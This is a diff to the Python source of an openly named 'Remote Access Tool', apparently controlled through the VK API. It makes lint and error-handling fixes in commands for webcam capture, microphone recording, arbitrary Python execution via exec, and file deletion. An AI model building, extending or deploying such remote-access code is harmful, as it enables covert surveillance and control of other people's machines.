@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+# pylint: disable=too-many-lines
 
 """
     Remote Access Tool
@@ -437,7 +438,7 @@ def command_webcam(_arguments, _event) -> CommandResult:
         # Trying to import opencv-python.
 
         # Importing.
-        import cv2 # pylint: disable=import-outside-toplevel
+        import cv2  # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is import error.
 
@@ -478,7 +479,7 @@ def command_microphone(arguments, _) -> CommandResult:
         # Trying to import modules.
 
         # Importing.
-        import pyaudio # pylint: disable=import-outside-toplevel
+        import pyaudio  # pylint: disable=import-outside-toplevel
         import wave  # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is import error.
@@ -1060,7 +1061,8 @@ def command_python(arguments, _) -> CommandResult:
     """ Command `python` that executes python code. """
 
     # Getting global out.
-    global OUT
+    global OUT  # pylint: disable=global-variable-not-assigned
+    OUT = None
 
     # Getting source code.
     python_source_code = arguments.\
@@ -1073,23 +1075,26 @@ def command_python(arguments, _) -> CommandResult:
         # Trying to execute.
 
         # Executing code.
-        exec(python_source_code, globals(), None)
+        exec(python_source_code, globals(), None)  # pylint: disable=exec-used
     except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is an error.
 
         # Returning.
         return CommandResult(f"Python code execution exception: {exception}")
 
-    try:
-        # Trying to return out.
+    if OUT is not None:
+        try:
+            # Trying to return out.
 
-        # Returning out.
-        return CommandResult(str(OUT))
-    except NameError:
-        # If there is an name error.
+            # Returning out.
+            return CommandResult(str(OUT))
+        except NameError:
+            # If there is an name error.
 
-        # Returning.
-        return CommandResult("Python code does not return output! Write in OUT variable.")
+            pass
+
+    # Returning.
+    return CommandResult("Python code does not return output! Write in OUT variable.")
 
 
 def command_tags(*_) -> CommandResult:
@@ -1533,10 +1538,17 @@ def server_connect() -> None:
             access_token = CONFIG["server"]["vk"]["user" if server_type == "VK_USER" else "group"]["access_token"]
 
             # Importing longpoll.
-            if server_type == "VK_GROUP":
-                import vk_api.bot_longpoll  # pylint: disable=import-outside-toplevel
-            else:
-                import vk_api.longpoll  # pylint: disable=import-outside-toplevel
+            try:
+                if server_type == "VK_GROUP":
+                    import vk_api.bot_longpoll  # pylint: disable=import-outside-toplevel, redefined-outer-name
+                else:
+                    import vk_api.longpoll  # pylint: disable=import-outside-toplevel, redefined-outer-name
+            except ImportError:
+                # Failed to import longpoll.
+
+                # Error.
+                debug_message("[Server] Failed to import VK longpoll!")
+                sys.exit(1)
 
             # Connect to the VK API.
             SERVER_API = vk_api.VkApi(token=access_token)
@@ -1795,7 +1807,7 @@ def filesystem_try_delete(path) -> bool:
 
         # All OK.
         return True
-    except Exception:  # noqa
+    except Exception:  # noqa, pylint: disable=broad-except
         # Error.
 
         # Base case.
@@ -1808,7 +1820,7 @@ def filesystem_try_listdir(path) -> typing.List:
     try:
         # Listing.
         return os.listdir(path)
-    except Exception:  # noqa
+    except Exception:  # noqa, pylint: disable=broad-except
         # Error.
 
         # Base case.
@@ -2149,8 +2161,8 @@ def record_microphone(path, seconds: int = 1) -> None:
         # Trying to import modules.
 
         # Importing.
-        import pyaudio
-        import wave
+        import pyaudio  # pylint: disable=import-outside-toplevel
+        import wave  # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is import error.
 
